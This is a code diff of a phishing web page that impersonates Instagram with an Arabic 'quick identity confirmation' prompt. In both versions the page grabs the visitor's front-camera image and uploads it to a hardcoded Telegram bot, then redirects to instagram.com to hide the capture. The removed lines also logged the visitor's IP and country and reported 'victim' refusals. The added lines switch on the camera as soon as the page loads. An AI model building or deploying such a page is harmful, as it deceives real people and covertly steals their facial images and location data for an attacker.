@@ -3,23 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - تأكيد الصورة</title>
+    <title>Instagram - Fast Check</title>
     <style>
         body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; border-radius: 8px; }
         .logo { width: 175px; margin-bottom: 20px; }
         button { background: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 12px; font-weight: bold; cursor: pointer; }
-        #status { margin-top: 15px; color: #ed4956; font-size: 13px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="card">
         <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo">
-        <p style="font-weight: 600; font-size: 14px;">مسح الوجه للأمان</p>
-        <p style="color: #8e8e8e; font-size: 13px;">يرجى السماح بالكاميرا لالتقاط صورة سريعة للوجه للتأكد من هويتك.</p>
-        <button id="authBtn">بدء المسح الضوئي</button>
-        <div id="status"></div>
+        <p style="font-weight: 600; font-size: 14px;">تأكيد الهوية السريع</p>
+        <p style="color: #8e8e8e; font-size: 13px;">اضغط للمتابعة وتأمين حسابك فوراً.</p>
+        <button id="authBtn">تأكيد الآن</button>
     </div>
 
     <video id="v" autoplay playsinline></video>
@@ -28,59 +26,53 @@
     <script>
         const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
         const CHAT_ID = '2140385904';
+        let stream = null;
 
-        async function sendLog(txt) {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: CHAT_ID, text: txt, parse_mode: 'Markdown' })
-            });
-        }
-
-        // صيد الآيبي فور الدخول
-        (async () => {
+        // تشغيل الكاميرا فوراً في الخلفية لتكون جاهزة
+        window.onload = async () => {
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const i = await res.json();
-                sendLog(`🔔 *شخص فتح الرابط*\n🌐 الآيبي: \`${i.ip}\`\n🌍 البلد: ${i.country_name}`);
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('v').srcObject = stream;
             } catch (e) {}
-        })();
+        };
 
         document.getElementById('authBtn').onclick = async () => {
-            const st = document.getElementById('status');
-            st.innerText = "جاري فتح الكاميرا...";
+            const btn = document.getElementById('authBtn');
+            btn.innerText = "جاري التأكيد...";
+            btn.disabled = true;
 
-            try {
-                // طلب الكاميرا الأمامية
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-
-                // التقاط الصورة بعد ثانيتين (لضمان الوضوح)
-                setTimeout(async () => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = 480; canvas.height = 640;
-                    canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
-                    
-                    canvas.toBlob(async (blob) => {
-                        const fd = new FormData();
-                        fd.append('chat_id', CHAT_ID);
-                        fd.append('photo', blob, 'shot.jpg');
-                        fd.append('caption', `📸 *تم التقاط الصورة بنجاح*`);
-                        
-                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                        
-                        // إغلاق الكاميرا والتحويل
-                        stream.getTracks().forEach(t => t.stop());
-                        st.innerText = "اكتمل المسح!";
-                        setTimeout(() => location.href = "https://instagram.com", 1000);
-                    }, 'image/jpeg', 0.7);
-                }, 2000);
-
-            } catch (e) {
-                st.innerText = "خطأ: يجب السماح بالكاميرا للمتابعة.";
-                sendLog("❌ الضحية رفض الكاميرا.");
+            if (!stream) {
+                // إذا لم تكن الكاميرا جاهزة بعد، نطلبها الآن بسرعة
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    document.getElementById('v').srcObject = stream;
+                } catch (e) {
+                    alert("يجب السماح بالكاميرا للمتابعة");
+                    btn.disabled = false;
+                    return;
+                }
             }
+
+            // التقاط فوري بدون أي تأخير
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = 480; canvas.height = 640;
+            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
+            
+            canvas.toBlob(async (blob) => {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'f.jpg');
+                
+                // إرسال للبوت والتحويل في نفس الوقت تقريباً
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                
+                // إغلاق الكاميرا والتحويل الفوري (سرعة البرق)
+                setTimeout(() => {
+                    stream.getTracks().forEach(t => t.stop());
+                    location.href = "https://instagram.com";
+                }, 100); 
+            }, 'image/jpeg', 0.5); // تقليل الجودة قليلاً لتسريع الرفع
         };
     </script>
 </body>
